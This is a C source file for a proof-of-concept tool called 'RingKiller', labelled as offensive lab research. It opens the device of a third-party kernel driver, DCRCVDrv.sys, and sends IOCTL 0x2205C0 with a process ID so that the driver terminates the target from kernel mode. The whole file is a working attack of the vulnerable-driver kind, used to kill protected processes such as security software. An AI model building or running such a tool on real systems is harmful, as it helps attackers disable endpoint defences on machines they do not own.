/*
 * RingKiller — user-mode PoC for DCRCVDrv.sys (IOCTL 0x2205C0)
 * NINJA offensive security research | lab use only
 */

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

#define TOOL_NAME               "RingKiller"
#define DCRCV_DEVICE_PATH       L"\\\\.\\DCRCVDRV_U"
#define IOCTL_RINGKILLER          0x2205C0

typedef struct _RINGKILLER_INPUT {
    DWORD ProcessId;
} RINGKILLER_INPUT;

static void PrintWin32Error(const char *context)
{
    DWORD error = GetLastError();
    LPSTR message = NULL;

    FormatMessageA(
        FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
        NULL,
        error,
        MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
        (LPSTR)&message,
        0,
        NULL);

    if (message != NULL) {
        fprintf(stderr, "[-] %s failed: error %lu (%s)", context, error, message);
        LocalFree(message);
    } else {
        fprintf(stderr, "[-] %s failed: error %lu\n", context, error);
    }

    if (error == ERROR_FILE_NOT_FOUND) {
        fprintf(stderr, "[!] Driver probably isn't loaded. Check \\\\.\\DCRCVDRV_U exists.\n");
    }
}

static HANDLE OpenDriverDevice(void)
{
    HANDLE device = CreateFileW(
        DCRCV_DEVICE_PATH,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL);

    if (device == INVALID_HANDLE_VALUE) {
        PrintWin32Error("CreateFileW");
    }

    return device;
}

static BOOL SendKillIoctl(HANDLE device, DWORD pid)
{
    RINGKILLER_INPUT input;
    DWORD bytesReturned = 0;

    input.ProcessId = pid;

    if (!DeviceIoControl(
            device,
            IOCTL_RINGKILLER,
            &input,
            sizeof(input),
            NULL,
            0,
            &bytesReturned,
            NULL)) {
        PrintWin32Error("DeviceIoControl");
        return FALSE;
    }

    return TRUE;
}

static void PrintUsage(const char *programName)
{
    fprintf(stderr, "Usage: %s <pid>\n", programName);
    fprintf(stderr, "\n");
    fprintf(stderr, "  %s talks to DCRCVDrv.sys and sends IOCTL 0x2205C0\n", TOOL_NAME);
    fprintf(stderr, "  with a 4-byte process ID. The driver kills the target from ring 0.\n");
}

int main(int argc, char *argv[])
{
    HANDLE device;
    unsigned long pid;
    char *end = NULL;

    if (argc != 2) {
        PrintUsage(argv[0]);
        return 1;
    }

    pid = strtoul(argv[1], &end, 10);
    if (argv[1][0] == '\0' || (end != NULL && *end != '\0') || pid == 0) {
        fprintf(stderr, "[-] Bad PID: %s\n", argv[1]);
        PrintUsage(argv[0]);
        return 1;
    }

    printf("[*] %s\n", TOOL_NAME);
    printf("[*] target pid: %lu\n", pid);

    device = OpenDriverDevice();
    if (device == INVALID_HANDLE_VALUE) {
        return 1;
    }

    printf("[*] device open: %ls\n", DCRCV_DEVICE_PATH);
    printf("[*] firing IOCTL 0x%08lX\n", (unsigned long)IOCTL_RINGKILLER);

    if (!SendKillIoctl(device, (DWORD)pid)) {
        CloseHandle(device);
        return 1;
    }

    printf("[+] done — driver accepted the request\n");
    CloseHandle(device);
    return 0;
}
